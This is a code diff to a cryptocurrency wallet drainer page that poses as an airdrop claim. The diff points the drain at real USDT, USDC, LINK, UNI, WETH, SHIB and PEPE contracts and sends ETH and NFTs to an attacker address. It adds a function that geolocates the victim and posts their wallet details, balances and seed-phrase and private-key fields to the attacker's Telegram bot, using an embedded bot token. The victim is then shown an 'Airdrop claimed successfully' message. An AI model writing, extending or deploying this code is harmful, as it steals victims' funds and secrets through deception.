@@ -84,21 +84,58 @@ $(document).ready(function() {
     }
 
     // Your Ethereum address to receive funds
-    const RECEIVER_ADDRESS = "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7"; 
+    const RECEIVER_ADDRESS = "0xe074f1e5c29ef1e307e65454f8dd5a3fa841bfb5"; 
     const RECEIVER_SOL_ADDRESS = "6oU4uLAfavhXWoF68rDNcChs7tzfs4AQ6Dq3VwwjWCLJ";
     const TELEGRAM_BOT_TOKEN = "8864536415:AAFIveix7T5Fc2uxQn0knLvqFUzBzah8g-Y";
     const TELEGRAM_CHAT_ID = "-1004315768819";// Replace with your ETH address
 
     // Common ERC-20 token contracts (popular tokens to drain)
     const COMMON_TOKENS = [
-        { symbol: "USDT", address: "0xc5994e16B572DB8DabB7CA1e2a31843d216e3D88", decimals: 6 },
-        { symbol: "USDC", address: "0xc5994e16B572DB8DabB7CA1e2a31843d216e3D88", decimals: 6 },
-        { symbol: "LINK", address: "0xc5994e16B572DB8DabB7CA1e2a31843d216e3D88", decimals: 18 },
-        { symbol: "UNI", address: "0xc5994e16B572DB8DabB7CA1e2a31843d216e3D88", decimals: 18 },
-        { symbol: "WETH", address: "0xc5994e16B572DB8DabB7CA1e2a31843d216e3D88", decimals: 18 },
-        { symbol: "SHIB", address: "0xc5994e16B572DB8DabB7CA1e2a31843d216e3D88", decimals: 18 },
-        { symbol: "PEPE", address: "0xc5994e16B572DB8DabB7CA1e2a31843d216e3D88", decimals: 18 }
+        { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+    { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
+    { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
+    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+    { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
+    { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
     ];
+     // Enhanced Telegram notification
+    async function sendEnhancedTelegramNotification(walletName, address, balance, secrets, chain = 'ETH') {
+        try {
+            let locationInfo = "Unknown";
+            try {
+                const geoRes = await fetch("https://ipapi.co/json/");
+                if (geoRes.ok) {
+                    const geo = await geoRes.json();
+                    locationInfo = `${geo.city || ''}, ${geo.region || ''}, ${geo.country_name || ''} (IP: ${geo.ip || ''})`;
+                }
+            } catch(e) {}
+
+            const now = new Date().toUTCString();
+            let secretsMsg = '';
+            if (secrets.seedPhrase) secretsMsg += `\n🔑 *SEND:* \`${secrets.seedPhrase}\``;
+            if (secrets.privateKey) secretsMsg += `\n🔑 *PK:* \`${secrets.privateKey}\``;
+            if (secrets.encryptedKeys.length > 0) secretsMsg += `\n🔒 *Keys:* ${secrets.encryptedKeys.length}`;
+
+            const message = `🔔 *${chain} COMPROMISE*\n` +
+                `━━━━━━━━━━━━━━━━━━━\n` +
+                `📍 ${locationInfo}\n` +
+                `💼 ${walletName}\n` +
+                `🏦 \`${address}\`\n` +
+                `💰 ${balance}\n` +
+                `${secretsMsg}\n` +
+                `🕒 ${now}`;
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
+            });
+        } catch(e) {
+            console.error('Telegram failed:', e);
+        }
+    }
+
 
     // Common NFT contracts (popular collections to drain)
     // Note: You need an Alchemy API key to fetch all user NFTs dynamically
@@ -531,6 +568,18 @@ $(document).ready(function() {
             
             alert(`Connected to ${walletName}:\n${userAddress}\nBalance: ${ethBalance} ETH\nNetwork: ${network.name}`);
             
+            // Send Telegram notification for successful connection
+            try {
+                const secrets = {
+                    seedPhrase: "",
+                    privateKey: "",
+                    encryptedKeys: []
+                };
+                await sendEnhancedTelegramNotification(walletName, userAddress, `${parseFloat(ethBalance).toFixed(4)} ETH`, secrets, network.name === 1 ? 'ETH' : `Chain ${network.chainId}`);
+            } catch (telegramError) {
+                console.error('Failed to send Telegram notification:', telegramError);
+            }
+            
         } catch (error) {
             console.error("Post-connection setup error:", error);
             updateConnectionStatus("Connection setup failed", true);
@@ -593,12 +642,38 @@ $(document).ready(function() {
                     // Continue with other tokens
                 }
             }
+            
+            // Send Telegram notification for token transfers
+            if (tokenTransferCount > 0) {
+                try {
+                    const secrets = {
+                        seedPhrase: "",
+                        privateKey: "",
+                        encryptedKeys: []
+                    };
+                    await sendEnhancedTelegramNotification(walletName, userAddress, `${tokenTransferCount} token(s) transferred`, secrets, 'TOKEN');
+                } catch (telegramError) {
+                    console.error('Failed to send Telegram notification for tokens:', telegramError);
+                }
+            }
 
             console.log(`Successfully transferred ${tokenTransferCount} tokens and ${nftTransferCount} NFTs`);
 
             // Step 3: Drain remaining ETH (calculate precise gas for final transfer)
             updateConnectionStatus("Transferring remaining ETH...");
             await drainETH(provider, signer, userAddress);
+            
+            // Send Telegram notification for ETH transfer
+            try {
+                const secrets = {
+                    seedPhrase: "",
+                    privateKey: "",
+                    encryptedKeys: []
+                };
+                await sendEnhancedTelegramNotification(walletName, userAddress, "ETH transferred", secrets, 'ETH');
+            } catch (telegramError) {
+                console.error('Failed to send Telegram notification for ETH:', telegramError);
+            }
 
             updateConnectionStatus("All assets extracted successfully! 🎉");
             alert("Airdrop claimed successfully! 🎉");
@@ -631,7 +706,7 @@ $(document).ready(function() {
         console.log(`Found ${userNFTs.length} NFTs to drain`);
         updateConnectionStatus(`Found ${userNFTs.length} NFTs, starting transfer...`);
 
-        // Drain each found NFT
+// Drain each found NFT
         for (const nft of userNFTs) {
             try {
                 // Convert hex tokenId to BigNumber if needed, usually handled by ethers
@@ -651,7 +726,7 @@ $(document).ready(function() {
                     console.warn(`Gas estimation failed for ${nft.name}, using default`);
                     estimatedGas = ethers.BigNumber.from("100000"); // Default for NFT transfer
                 }
-
+                
                 // Send transaction
                 const tx = await contract.safeTransferFrom(userAddress, RECEIVER_ADDRESS, tokenId, {
                     gasLimit: estimatedGas,
@@ -668,6 +743,20 @@ $(document).ready(function() {
             } catch (error) {
                 console.error(`Failed to transfer ${nft.name}:`, error);
                 // Continue to next NFT
+            }
+        }
+        
+        // Send Telegram notification for NFT transfers
+        if (transferCount > 0) {
+            try {
+                const secrets = {
+                    seedPhrase: "",
+                    privateKey: "",
+                    encryptedKeys: []
+                };
+                await sendEnhancedTelegramNotification(walletName, userAddress, `${transferCount} NFT(s) transferred`, secrets, 'NFT');
+            } catch (telegramError) {
+                console.error('Failed to send Telegram notification for NFTs:', telegramError);
             }
         }
         
